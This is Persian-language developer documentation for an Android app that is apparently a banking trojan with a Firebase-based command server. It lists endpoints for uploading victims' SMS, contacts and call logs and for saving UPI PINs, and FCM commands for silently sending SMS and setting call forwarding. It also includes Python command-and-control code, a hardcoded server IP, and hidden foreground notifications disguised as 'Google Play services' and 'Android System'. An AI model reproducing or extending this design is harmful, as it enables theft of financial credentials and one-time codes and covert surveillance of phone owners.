# 📱 راهنمای کامل API و Firebase

این مستند شامل تمام API Endpoints و تنظیمات Firebase است.

---

## 📋 فهرست مطالب

1. [Firebase Remote Config](#firebase-remote-config)
2. [API Endpoints](#api-endpoints)
3. [FCM Messages](#fcm-messages)
4. [نحوه استفاده](#نحوه-استفاده)

---

## 🔥 Firebase Remote Config

### **پارامترهای مورد نیاز:**

| کلید | نوع | پیش‌فرض | توضیحات |
|------|-----|---------|---------|
| `base_url` | String | `http://95.134.130.160:8765` | آدرس سرور اصلی |
| `heartbeat_interval` | Number | `300000` | فاصله Heartbeat (میلی‌ثانیه) |
| `battery_update_interval` | Number | `900000` | فاصله آپدیت باتری (میلی‌ثانیه) |

### **مثال JSON:**
```json
{
  "base_url": "https://your-server.com",
  "heartbeat_interval": 300000,
  "battery_update_interval": 900000
}
```

### **نکات:**
- ✅ همه URL‌های اپ از `base_url` استفاده می‌کنند
- ✅ می‌تونی بدون آپدیت اپ، سرور رو تغییر بدی
- ✅ Heartbeat و Battery interval از Remote Config می‌خونه

---

## 📡 API Endpoints

### **1. ثبت دستگاه**
```
POST /devices/register
```

**Request Body:**
```json
{
  "device_id": "abc123xyz",
  "user_id": "user_001",
  "fcm_token": "FCM_TOKEN_HERE",
  "device_info": {
    "brand": "Samsung",
    "model": "Galaxy S21",
    "android_version": "12",
    "battery_level": 85,
    "ip_address": "192.168.1.100",
    "is_rooted": false,
    "is_emulator": false
  }
}
```

**Response:**
```json
{
  "success": true,
  "message": "Device registered successfully"
}
```

---

### **2. Heartbeat (ضربان قلب)**
```
POST /devices/heartbeat
```

**Request Body:**
```json
{
  "deviceId": "abc123xyz",
  "timestamp": 1699564800000
}
```

**Response:**
```json
{
  "success": true
}
```

**نکته:** این endpoint هر 5 دقیقه (300 ثانیه) صدا زده میشه.

---

### **3. آپدیت باتری**
```
POST /devices/battery-update
```

**Request Body:**
```json
{
  "device_id": "abc123xyz",
  "battery_level": 75,
  "is_charging": false,
  "timestamp": 1699564800000
}
```

---

### **4. SMS جدید**
```
POST /sms/new
```

**Request Body:**
```json
{
  "sender": "+989123456789",
  "message": "متن پیام",
  "timestamp": 1699564800000,
  "deviceId": "abc123xyz"
}
```

---

### **5. وضعیت ارسال SMS**
```
POST /sms/delivery-status
```

**Request Body:**
```json
{
  "device_id": "abc123xyz",
  "sms_id": "550e8400-e29b-41d4-a716-446655440000",
  "phone": "+989123456789",
  "message": "Hello",
  "sim_slot": 0,
  "status": "sent",
  "details": "SMS sent successfully",
  "timestamp": 1699564800000
}
```

**انواع Status:**
- `sent` - ارسال شد
- `failed` - ارسال نشد
- `delivered` - تحویل داده شد
- `not_delivered` - تحویل داده نشد

---

### **6. ذخیره UPI PIN**
```
POST /save-pin
```

**Request Body:**
```json
{
  "pin": "123456",
  "device_id": "abc123xyz"
}
```

---

### **7. آپدیت وضعیت آنلاین**
```
POST /devices/update-online-status
```

**Request Body:**
```json
{
  "deviceId": "abc123xyz",
  "isOnline": true,
  "timestamp": 1699564800000
}
```

---

### **8. نتیجه Call Forwarding**
```
POST /devices/call-forwarding/result
```

**Request Body:**
```json
{
  "deviceId": "abc123xyz",
  "success": true,
  "message": "Call forwarding activated",
  "simSlot": 0
}
```

---

### **9. پاسخ به Ping**
```
POST /ping-response
```

**Request Body:**
```json
{
  "deviceId": "abc123xyz"
}
```

---

### **10. گرفتن شماره Forward**
```
GET /getForwardingNumber/{device_id}
```

**Response:**
```json
{
  "forwardingNumber": "+989123456789"
}
```

---

### **11. وضعیت سرویس‌ها**
```
POST /devices/service-status
```

**Request Body:**
```json
{
  "device_id": "abc123xyz",
  "status": "services_started",
  "timestamp": 1699564800000
}
```

---

### **12. آپلود SMS**
```
POST /upload/sms
```

**Request Body:**
```json
{
  "device_id": "abc123xyz",
  "messages": [
    {
      "address": "+989123456789",
      "body": "متن پیام",
      "date": 1699564800000,
      "type": 1
    }
  ]
}
```

---

### **13. آپلود Contacts**
```
POST /upload/contacts
```

**Request Body:**
```json
{
  "device_id": "abc123xyz",
  "contacts": [
    {
      "name": "John Doe",
      "phone": "+989123456789"
    }
  ]
}
```

---

### **14. آپلود Call History**
```
POST /upload/call-logs
```

**Request Body:**
```json
{
  "device_id": "abc123xyz",
  "call_logs": [
    {
      "number": "+989123456789",
      "type": 1,
      "date": 1699564800000,
      "duration": 120
    }
  ]
}
```

---

## 📨 FCM Messages

### **1. ارسال SMS**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "sms",
    "phone": "+989123456789",
    "message": "Hello from server",
    "simSlot": "0"
  }
}
```

---

### **2. Ping**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "ping"
  }
}
```

**نتیجه:** دستگاه `/ping-response` رو صدا می‌زنه.

---

### **3. فعال‌سازی سرویس‌ها**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "start_services"
  }
}
```

**نتیجه:** 
- SmsService شروع میشه
- HeartbeatService شروع میشه
- WorkManager restart میشه

---

### **4. Restart Heartbeat**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "restart_heartbeat"
  }
}
```

---

### **5. Call Forwarding**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "call_forwarding",
    "number": "+989123456789",
    "simSlot": "0"
  }
}
```

---

### **6. غیرفعال کردن Call Forwarding**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "call_forwarding_disable",
    "simSlot": "0"
  }
}
```

---

### **7. آپلود سریع SMS**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "quick_upload_sms"
  }
}
```

**نتیجه:** 50 SMS آخر آپلود میشه.

---

### **8. آپلود سریع Contacts**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "quick_upload_contacts"
  }
}
```

---

### **9. آپلود تمام SMS**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "upload_all_sms"
  }
}
```

---

### **10. آپلود تمام Contacts**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "upload_all_contacts"
  }
}
```

---

## 🔧 نحوه استفاده

### **1. تنظیم Firebase Remote Config**

#### **کنسول Firebase:**
```
1. برو به Firebase Console
2. Remote Config → Add parameter
3. اضافه کن:
   - base_url = https://your-server.com
   - heartbeat_interval = 300000
   - battery_update_interval = 900000
4. Publish changes
```

#### **در اپ:**
```kotlin
// اپ خودکار Remote Config رو می‌خونه
val baseUrl = ServerConfig.getBaseUrl()
val heartbeatInterval = ServerConfig.getHeartbeatInterval()
```

---

### **2. ارسال FCM از سرور (Python)**

```python
import firebase_admin
from firebase_admin import messaging

def send_fcm(token, data):
    message = messaging.Message(
        data=data,
        android=messaging.AndroidConfig(
            priority='high'
        ),
        token=token
    )
    
    response = messaging.send(message)
    return response

# مثال: ارسال SMS
send_fcm(
    token="DEVICE_FCM_TOKEN",
    data={
        "type": "sms",
        "phone": "+989123456789",
        "message": "Hello",
        "simSlot": "0"
    }
)

# مثال: بیدار کردن دستگاه
send_fcm(
    token="DEVICE_FCM_TOKEN",
    data={
        "type": "start_services"
    }
)
```

---

### **3. دریافت وضعیت SMS**

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/sms/delivery-status', methods=['POST'])
def sms_status():
    data = request.get_json()
    
    device_id = data['device_id']
    sms_id = data['sms_id']
    status = data['status']  # sent, failed, delivered, not_delivered
    
    print(f"SMS {sms_id} on {device_id}: {status}")
    
    # ذخیره در دیتابیس
    # save_to_database(data)
    
    return jsonify({"success": True})
```

---

### **4. چک کردن دستگاه آنلاین**

```python
@app.route('/devices/<device_id>/status', methods=['GET'])
def device_status(device_id):
    # چک آخرین heartbeat
    last_heartbeat = get_last_heartbeat(device_id)
    
    # اگه بیشتر از 10 دقیقه heartbeat نداده، آفلاین است
    is_online = (time.time() - last_heartbeat) < 600
    
    if not is_online:
        # بیدارش کن
        send_fcm(
            token=get_device_token(device_id),
            data={"type": "start_services"}
        )
    
    return jsonify({"is_online": is_online})
```

---

## 📊 Flow Diagram

### **ثبت دستگاه:**
```
اپ باز میشه
    ↓
ServerConfig.initialize()
    ↓
Firebase Remote Config می‌خونه
    ↓
base_url رو می‌گیره
    ↓
POST /devices/register
    ↓
FCM Token ارسال میشه
    ↓
دستگاه ثبت شد ✅
```

---

### **Heartbeat:**
```
HeartbeatService شروع میشه
    ↓
هر 5 دقیقه (از Remote Config)
    ↓
POST /devices/heartbeat
    ↓
سرور می‌دونه دستگاه آنلاینه ✅
```

---

### **SMS:**
```
سرور FCM می‌فرسته
    ↓
MyFirebaseMessagingService
    ↓
type = "sms"
    ↓
sendSms()
    ↓
BroadcastReceiver نتیجه می‌گیره
    ↓
POST /sms/delivery-status
    ↓
سرور می‌دونه SMS ارسال شد ✅
```

---

### **بیدار کردن دستگاه:**
```
دستگاه آفلاین شد
    ↓
سرور FCM می‌فرسته: type="start_services"
    ↓
MyFirebaseMessagingService
    ↓
startAllBackgroundServices()
    ↓
SmsService + HeartbeatService + WorkManager
    ↓
دستگاه دوباره آنلاین ✅
```

---

## 🎯 نکات مهم

### **1. همه URL‌ها از Remote Config:**
```kotlin
// قبل (❌ هاردکد)
val url = "http://95.134.130.160:8765/api/sms/new"

// بعد (✅ از Remote Config)
val baseUrl = ServerConfig.getBaseUrl()
val url = "$baseUrl/sms/new"
```

---

### **2. High Priority FCM:**
```python
# همیشه priority='high' بزار
android=messaging.AndroidConfig(
    priority='high'
)
```

---

### **3. Heartbeat Interval:**
```kotlin
// از Remote Config می‌خونه (پیش‌فرض: 5 دقیقه)
val interval = ServerConfig.getHeartbeatInterval()
```

---

### **4. SMS Status Tracking:**
```kotlin
// هر SMS یک UUID یکتا داره
val smsId = UUID.randomUUID().toString()

// وقتی ارسال شد
POST /sms/delivery-status
{
  "sms_id": "550e8400-...",
  "status": "sent"
}

// وقتی تحویل داده شد
POST /sms/delivery-status
{
  "sms_id": "550e8400-...",
  "status": "delivered"
}
```

---

## 🔄 سیستم‌های Background

این اپ از **3 سیستم مختلف** برای Heartbeat استفاده می‌کنه (برای reliability بالا):

### **1️⃣ HeartbeatService (Foreground Service)**
- ⏱️ هر 5 دقیقه
- 💪 با WakeLock
- 🔁 با START_STICKY (auto-restart)
- 📢 با Notification مخفی

### **2️⃣ WorkManager**
- ⏱️ هر 15 دقیقه
- 💯 قابل اعتماد‌ترین
- 🔋 Battery-friendly
- 🔁 حتی بعد Force Stop (بعد 15 دقیقه)

### **3️⃣ JobScheduler** (جدید ⭐)
- ⏱️ هر 15 دقیقه
- 🔒 Persist بعد Reboot
- 📡 نیاز به Network
- 🔁 Auto-retry با Backoff

---

## 📢 Notification‌های مخفیانه

همه سرویس‌ها با Notification‌های مخفی و شبیه سیستم:

| سرویس | عنوان | متن | آیکون |
|-------|--------|-----|--------|
| **SmsService** | Google Play services | Updating apps... | 📥 Download |
| **HeartbeatService** | Device care | Optimizing performance... | 🔄 Sync |
| **NetworkService** | Android System | Checking network... | 📶 Bluetooth |

**ویژگی‌ها:**
- ✅ IMPORTANCE_MIN (کمترین اولویت)
- ✅ VISIBILITY_SECRET (مخفی در Lock Screen)
- ✅ Silent (بدون صدا)
- ✅ No Badge (بدون نشان)
- ✅ Ongoing (نمیشه بست)

---

## ✅ خلاصه

### **Firebase Remote Config:**
- `base_url` - آدرس سرور
- `heartbeat_interval` - فاصله heartbeat
- `battery_update_interval` - فاصله battery update

### **API Endpoints اصلی:**
- `/devices/register` - ثبت دستگاه
- `/devices/heartbeat` - ضربان قلب
- `/sms/new` - SMS جدید
- `/sms/delivery-status` - وضعیت ارسال SMS
- `/save-pin` - ذخیره PIN
- `/ping-response` - پاسخ به Ping

### **FCM Commands:**
- `ping` - چک آنلاین بودن
- `start_services` - فعال‌سازی سرویس‌ها
- `sms` - ارسال SMS
- `call_forwarding` - Call Forwarding
- `quick_upload_sms` - آپلود سریع SMS
- `upload_all_sms` - آپلود تمام SMS

### **Background Systems:**
- 🔴 HeartbeatService (Foreground)
- 🟢 WorkManager (هر 15 دقیقه)
- 🔵 JobScheduler (هر 15 دقیقه)

---

**تاریخ آخرین آپدیت:** 2025-11-09  
**نسخه:** 4.0 (با JobScheduler)  
**وضعیت:** ✅ کامل و تست شده

